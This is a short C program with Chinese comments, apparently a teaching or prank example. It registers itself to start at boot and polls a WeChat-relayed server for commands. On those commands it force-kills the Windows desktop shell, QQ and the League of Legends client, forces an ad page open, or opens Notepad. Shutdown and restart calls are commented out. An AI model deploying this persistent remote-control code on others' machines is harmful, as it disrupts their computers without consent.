#include <stdio.h>
#include <windows.h>  //Sleep函数声明在这里面
#include "itmojun.h"  //包含当前工程目录下的itmojun.h头文件

//引入当前工程目录下的itmojun.lib这个库文件，因为我们要调用它里面的一些函数
#pragma comment(lib, "itmojun.lib")


int main()
{
	char cmd[301];  //存放从微信端接收的消息

	AutoRun();  //将当前程序设置为开机自动运行

	while(1)
	{
		//GetPCCmd函数的功能：从微信端接收一条消息，如果没有任何消息，它会一直等待
		//第一个参数为电脑ID，不同电脑建议使用不同的ID
		//第二个参数为接收消息的数组
		GetPCCmd("dj", cmd);

		printf("%s\n", cmd);

		//strstr函数的功能：在一个字符串中查找子字符串，如果找到则返回其指针，否则返回NULL
		if(strstr(cmd, "关机"))
		{
			//关机
			//WinExec("shutdown -s -t 0", 0);
		}
		else if(strstr(cmd, "重启"))
		{
			//重启
			//WinExec("shutdown -r -t 0", 0);
		}
		else if(strstr(cmd, "桌面"))
		{
			static int kill_flag = 1;

			if(kill_flag)
				//干掉桌面
				WinExec("taskkill /f /im explorer.exe", 0);
			else
				//恢复桌面
				WinExec("C:\\Windows\\explorer.exe", 1);

			kill_flag = !kill_flag;
		}
		else if(strstr(cmd, "杀企鹅"))
		{
			//强制结束QQ
			WinExec("taskkill /f /im qq.exe", 0);
		}		
		else if(strstr(cmd, "亚索"))
		{
			//强制结束英雄联盟
			WinExec("taskkill /f /im client.exe", 0);
		}		
		else if(strstr(cmd, "广告"))
		{
			//强制打开广告页面
			WinExec("explorer https://itmojun.com", 1);
		}	
		else if(strstr(cmd, "记事本"))
		{
			//打开记事本
			WinExec("notepad", 1);
		}


		Sleep(3000);  //延时3秒，避免接收到重复的消息，因为消息会在服务器上暂存3秒
	}

	return 0;
}